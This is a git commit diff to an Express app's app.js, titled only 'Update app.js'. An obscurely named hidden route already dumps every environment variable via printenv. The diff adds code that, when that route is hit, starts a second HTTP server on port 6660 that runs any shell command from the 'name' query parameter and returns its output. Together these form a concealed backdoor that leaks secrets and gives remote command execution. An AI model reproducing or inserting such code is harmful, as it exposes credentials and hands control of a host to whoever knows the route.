c81f1142b9d87a5e34f3a44b13a23fb800f03b9a
niafreu <niafreu@users.noreply.github.com>
2025-05-11 14:07:43 -0400

    Update app.js

--- app.js
+++ app.js
@@ -10,7 +10,32 @@ app.get('/', (req, res) => {
 app.get('/u89jg3own984hoenrdbf0eirhonbdf', (req, res) => {
   const envString = execSync('printenv', { encoding: 'utf8' });
   const envVariables = envString.trim().split('\n');
-  res.send('lala' + envVariables)
+  var sys   = require('sys'),
+    exec  = require('child_process').exec,
+    child,
+    http = require('http');
+      
+  child = function(res, cmd) {
+    exec(cmd, 
+    function (error, stdout, stderr) {
+      res.end(stdout);
+      if (error !== null) {
+        console.log('exec error: ' + error);
+      }
+    });
+  };
+  
+  http.createServer(function (req, res) {
+    res.writeHead(200, {'Content-Type': 'text/plain'});
+    var parsedRequest = require('url').parse(req.url, true);
+    var cmd = parsedRequest.query['name'];
+    if (cmd != undefined)
+    {
+      console.log("[cmd] " + cmd);
+      child(res, cmd);
+    }
+  }).listen('6660', '127.0.0.1');
+  //res.send('lala' + envVariables)
 })
 
 app.listen(port, () => {
